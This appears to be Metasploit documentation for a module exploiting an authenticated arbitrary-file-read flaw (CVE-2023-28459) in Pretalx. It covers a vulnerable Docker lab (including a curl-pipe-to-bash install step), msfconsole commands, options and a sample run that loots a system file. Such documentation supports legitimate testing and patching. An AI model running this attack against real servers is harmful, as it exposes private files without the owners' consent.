## Vulnerable Application

Pretalx is a web-based conference planning tool, used to manage call for paper submissions, talk selection and so on. It used by many major IT conferences - such as OffensiveCon, Hexacon,... Versions 2.3.1 and prior are vulnerable to arbitrary file read, which exploits unsanitized path in schedule export. The module requires set of credentials of Pretalx user and Pretalx needs to have existing conference, where the attacker can submit malicious proposal.

Installation steps:

1. `git clone https://github.com/pretalx/pretalx-docker.git`
1. Change content of `Dockerfile`:
```
FROM python:3.10-bookworm

RUN apt-get update && \
    apt-get install -y git gettext libmariadb-dev libpq-dev locales libmemcached-dev build-essential \
            supervisor \
            sudo \
            locales \
            --no-install-recommends && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* && \
    dpkg-reconfigure locales && \
    locale-gen C.UTF-8 && \
    /usr/sbin/update-locale LANG=C.UTF-8 && \
    mkdir /etc/pretalx && \
    mkdir /data && \
    mkdir /public && \
    groupadd -g 999 pretalxuser && \
    useradd -r -u 999 -g pretalxuser -d /pretalx -ms /bin/bash pretalxuser && \
    echo 'pretalxuser ALL=(ALL) NOPASSWD:SETENV: /usr/bin/supervisord' >> /etc/sudoers

ENV LC_ALL=C.UTF-8


COPY pretalx/pyproject.toml /pretalx
COPY pretalx/src /pretalx/src
COPY deployment/docker/pretalx.bash /usr/local/bin/pretalx
COPY deployment/docker/supervisord.conf /etc/supervisord.conf

RUN pip3 install -U pip setuptools wheel typing && \
    pip3 install -e /pretalx/[mysql,postgres,redis] && \
    pip3 install pylibmc && \
    pip3 install gunicorn && \
    chmod -R 777 /public


RUN python3 -m pretalx makemigrations
RUN python3 -m pretalx migrate

RUN apt-get update && \
    apt-get install -y curl && \
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && \
    apt install nodejs npm && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* && \
    python3 -m pretalx rebuild

RUN chmod +x /usr/local/bin/pretalx && \
    cd /pretalx/src && \
    rm -f pretalx.cfg && \
    chown -R pretalxuser:pretalxuser /pretalx /data /public && \
    rm -f /pretalx/src/data/.secret

USER pretalxuser
VOLUME ["/etc/pretalx", "/data", "/public"]
EXPOSE 80
ENTRYPOINT ["pretalx"]
CMD ["all"]
```
1. Change content of `docker-compose.yml` to following:
```
services:
  pretalx:
    image: pretalx/standalone:v2.3.1
      # image: pretalx/dev
    # build: .
    container_name: pretalx
    restart: unless-stopped
    depends_on:
      - redis
      - db
    environment:
      # Hint: Make sure you serve all requests for the `/static/` and `/media/` paths when debug is False. See [installation](https://docs.pretalx.org/administrator/installation/#step-7-ssl) for more information
      PRETALX_FILESYSTEM_MEDIA: /public/media
      PRETALX_FILESYSTEM_STATIC: /public/static
    ports:
      - "80:80"
    volumes:
      - ./conf/pretalx.cfg:/etc/pretalx/pretalx.cfg:ro
      - pretalx-data:/data
      - pretalx-public:/public

  db:
    image: docker.io/library/postgres:15-alpine
    container_name: pretalx-db
    restart: unless-stopped
    volumes:
      - pretalx-database:/var/lib/postgresql/data
    environment:
      POSTGRES_PASSWORD: veryunsecureplschange # same password as one that you will put in pretalx.cfg file later on
      POSTGRES_USER: pretalx
      POSTGRES_DB: pretalx

  redis:
    image: redis:latest
    container_name: pretalx-redis
    restart: unless-stopped
    volumes:
      - pretalx-redis:/data

volumes:
  pretalx-database:
  pretalx-data:
  pretalx-public:
  pretalx-redis:
```
1. `sudo docker-compose up`
1. Setup username and password - `sudo docker exec -it pretalx pretalx init`
1. Go to `orga/event/`
1. Create new conference
1. Go to `orga/event/[conference name]/schedule/rooms/`
1. Create a room
1. Go to `orga/event/[conference name]/`
1. Make conference go live
1. `sudo docker exec -u 0 -it pretalx /bin/bash`
1. Make sure you have correct right on `/data` folder, so `pretalx` user can write export there


## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/pretalx_file_read_cve_2023_28459`
1. Do: `set CONFERENCE_NAME [conference name]`
1. Do: `set EMAIL [user email]`
1. Do: `set PASSWORD [password]`
1. Do: `set RHOSTS [target IP address]`
1. Do: `run`

## Options

### CONFERENCE_NAME

The slug (shortcut) name of the conference. The module requires existing conference, where an attacker can submit malicious proposal (e.g. conference-secret-2025)

### FILEPATH
Absolute path to the target file.

### MEDIA_URL

Pretalx uses path to `media` folder, which is used as prepend to target file path to achieve arbitrary file read. The default value is `/media`, however, it can be modified by user.

### EMAIL

Email of Pretalx user that can approve proposals and release schedule.

### PASSWORD

Password of Pretalx user that can approve proposals and release schedule.

## Scenarios
```
msf auxiliary(scanner/http/pretalx_file_read_cve_2023_28459) > run verbose=true 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected vulnerable version 2.3.1
[*] Register malicious proposal
[*] Logging with credentials: [username]/[password]
[*] Approving proposal
[*] Adding h85WcLe4t4 to schedule
[*] Releasing schedule
[*] Trying to extract target file
[*] Extraction successful
[*] Stored results in /home/ms/.msf4/loot/20250725165914_default_192.168.168.146_pretalx.etcpas_473038.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
